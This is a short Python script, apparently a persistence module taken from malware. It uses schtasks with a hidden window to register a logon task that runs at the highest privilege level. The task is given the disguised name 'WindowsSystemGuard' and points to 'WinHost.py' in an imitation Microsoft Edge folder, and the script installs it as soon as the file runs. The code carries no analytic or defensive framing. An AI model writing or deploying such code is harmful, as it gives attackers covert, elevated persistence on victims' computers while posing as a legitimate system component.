import subprocess

def task_scheduler_command(args):
    # Check if autorun is disabled

    # Add the task to autorun
    start_info = subprocess.STARTUPINFO()
    start_info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    start_info.wShowWindow = subprocess.SW_HIDE

    try:
        subprocess.run(
            ["schtasks.exe"] + args.split(),
            startupinfo=start_info,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=True,
        )
    except subprocess.CalledProcessError as e:
        print("Error:", e)

def set_autorun():
    print("[+] Installing to autorun...")
    config = {
        "AutorunEnabled": True,
        "AutorunName": "WindowsSystemGuard",
        "InstallPath": "C:\\Apps\\Windows\\MicrosoftEdge\\set\\f\\WinHost.py",
    }
    task_scheduler_command(
        f"/create /f /sc ONLOGON /RL HIGHEST /tn \"{config['AutorunName']}\" /tr \"{config['InstallPath']}\""
    )

# Example usage:
set_autorun()
